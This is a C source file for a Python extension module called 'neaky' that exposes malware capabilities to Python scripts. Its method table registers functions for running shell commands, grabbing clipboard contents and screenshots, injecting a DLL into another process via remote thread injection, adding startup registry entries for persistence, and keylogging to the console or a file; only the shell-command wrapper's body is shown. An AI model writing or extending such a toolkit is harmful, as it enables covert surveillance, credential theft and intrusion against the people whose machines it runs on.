#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include "py_functions.h"

static PyObject *SpamError;

static PyObject *
neaky_system(PyObject *self, PyObject *args)
{
    const char *command;
    int sts;

    puts("hello world!~~");
    if (!PyArg_ParseTuple(args, "s", &command))
        return NULL;
    sts = system(command);
    if (sts < 0) {
        PyErr_SetString(SpamError, "System command failed");
        return NULL;
    }
    return PyLong_FromLong(sts);
}

static PyMethodDef SpamMethods[] = {
    {"system",  neaky_system, METH_VARARGS,
     "Execute a shell command."},
    {"clipboard",  neaky_clipboard, METH_NOARGS,
     "Get clipboard content."},
    {"screenshot",  neaky_screenshot, METH_VARARGS,
     "Save screenshot to path."},
    {"get_pid_by_name",  neaky_get_pid_by_name, METH_VARARGS,
     "Get processes's id by name."},
    {"remote_thread_injection",  neaky_remote_thread_injection, METH_VARARGS,
     "Inject dll to target process."},
    {"set_startup_reg",  neaky_set_startup_reg, METH_VARARGS,
     "Set a entry in startup registry."},
    {"delete_startup_reg",  neaky_delete_startup_reg, METH_VARARGS,
     "Delete a entry in startup registry."},
    {"keylog_stdout",  neaky_keylog_stdout, METH_NOARGS,
     "Start keylogging and show."},
    {"keylog_to_file",  neaky_keylog_to_file, METH_VARARGS,
     "Start keylogging into a file."},
    {"keylog_to_file_stop",  neaky_keylog_to_file_stop, METH_NOARGS,
     "Stop keylogging to file."},
    {"message_loop",  neaky_message_loop, METH_NOARGS,
     "Start message loop."},
    {NULL, NULL, 0, NULL}        /* Sentinel */
};

static struct PyModuleDef neakymodule = {
    PyModuleDef_HEAD_INIT,
    "neaky",   /* name of module */
    NULL, /* module documentation, may be NULL */
    -1,       /* size of per-interpreter state of the module,
                 or -1 if the module keeps state in global variables. */
    SpamMethods
};

PyMODINIT_FUNC
PyInit_neaky(void)
{
    PyObject *m;

    m = PyModule_Create(&neakymodule);
    if (m == NULL)
        return NULL;

    SpamError = PyErr_NewException("spam.error", NULL, NULL);
    Py_XINCREF(SpamError);
    if (PyModule_AddObject(m, "error", SpamError) < 0) {
        Py_XDECREF(SpamError);
        Py_CLEAR(SpamError);
        Py_DECREF(m);
        return NULL;
    }

    // module specific init code here


    return m;
}

